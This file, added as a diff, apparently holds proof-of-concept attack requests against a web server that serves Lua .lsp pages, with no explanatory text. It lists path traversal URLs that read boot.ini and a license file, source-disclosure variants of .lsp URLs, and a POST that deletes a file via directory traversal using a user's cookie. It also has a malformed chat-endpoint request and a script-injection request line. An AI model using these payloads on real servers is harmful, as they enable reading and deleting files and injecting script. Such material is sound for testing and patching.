@@ -1,0 +1,28 @@
+A]
+http://www.example.com/\..\..\..\boot.ini
+http://www.example.com/%80..\..\..\boot.ini
+http://www.example.com/%ff..\bdlicense.dat
+
+B]
+http://www.example.com/lua.lsp+
+http://www.example.com/lua.lsp.
+http://www.example.com/lua.lsp%80
+
+C]
+POST /drive/c/bdusers/USER/?cmd=rm HTTP/1.1
+Host: www.example.com
+Cookie: &quot;use the real user&#039;s cookie!&quot;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+
+dir=..\..\..\file.txt
+
+D]
+POST /eh/chat.ehintf/C. HTTP/1.1
+Host: www.example.com
+Content-Type: text/plain
+Content-Length: 0
+Cookie: &quot;use the real user&#039;s cookie!&quot;
+
+E]
+GET &lt;script&gt;alert(&#039;hello&#039;);&lt;/script&gt; HTTP/1.0
